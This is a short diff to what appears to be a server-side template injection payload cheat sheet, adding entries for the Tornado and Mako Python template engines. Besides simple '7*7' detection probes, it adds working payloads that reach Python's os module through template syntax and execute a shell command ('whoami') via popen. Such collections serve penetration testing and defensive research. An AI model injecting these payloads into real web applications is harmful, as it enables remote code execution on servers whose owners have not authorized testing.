@@ -141,5 +141,14 @@ ${{7*7}}
 ### Tornado(Python)
 ```
 {{7*7}}
+```
+```python
 {{__import__('os').popen('whoami').read()}}
+```
+### Mako(Python)
+```
+${7*7}
+```
+```python
+${self.module.cache.util.os.popen("whoami").read()}
 ```
